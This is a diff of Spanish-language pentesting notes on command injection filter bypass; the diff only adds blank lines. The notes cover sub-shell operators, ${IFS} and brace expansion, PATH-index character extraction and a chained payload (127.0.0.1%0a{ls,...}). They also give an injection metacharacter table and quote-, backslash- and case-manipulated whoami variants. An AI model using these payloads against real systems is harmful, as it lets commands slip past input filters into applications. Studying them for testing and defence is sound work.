@@ -12,36 +12,71 @@ Sub-Shell  `` 	%60%60 	Both (Linux-only)
 Sub-Shell  $() 	%24%28%29 	Both (Linux-only)
 
 podemos luego de encontrar el conector entre comandos, si hay algún filtro posterior utilizar diferentes secuencias:
+
+
 ${IFS} inserta un espacio y una tabulación y luego el comando
+
+
 {ls,-la} agrega comandos como argumentos y agregando espacios en los mismos
 
 para bypassear blacklisted characters se puede utilizar una extracción del caracter del index de una variable de entorno:
+
+
 ${PATH:0:1} (en este caso estaríamos extrayendo el caracter del index 0 de la variable PATH que sería "/"
+
+
 $env:HOMEPATH[0] mismo ejemplo en windows
 
 podemos concatenar estas técnicas, ej:
+
+
 127.0.0.1%0a{ls,${PATH:0:1}home}
 
 SQL Injection 	' , ; -- /* */
+
+
 Command Injection 	; &&
+
+
 LDAP Injection 	* ( ) & |
+
+
 XPath Injection 	' or and not substring concat count
+
+
 OS Command Injection 	; & |
+
+
 Code Injection 	' ; -- /* */ $() ${} #{} %{} ^
+
+
 Directory Traversal/File Path Traversal 	../ ..\\ %00
+
+
 Object Injection 	; & |
+
+
 XQuery Injection 	' ; -- /* */
+
+
 Shellcode Injection 	\x \u %u %n
+
+
 Header Injection 	\n \r\n \t %0d %0a %09
+
+
 
 ### bypass command blacklisted
 
 podemos agregar caracteres que no son tomados en cuenta en linux y windows como las comillas simples y dobles entre la morfologia del comando
+
 who'am'i
+
 who"am"i
 
 ##### Linux only:
 who$@ami
+
 w\ho\am\i
 
 ##### Windows:
@@ -49,7 +84,9 @@ w\ho\am\i
 
 podemos encontrarnos otras medidas como firewalls que nos bloqueen los comandos, con lo cual podemos utilizar diferentes técnicas de bypass:
 Case manipulation:
+
 WhOaMi 
+
 Para las terminales case-sensitive como la terminal de linux, podemos utilizar comandos como:
 
   $(tr "[A-Z]"%09"[a-z]"<<<"WhOaMi")
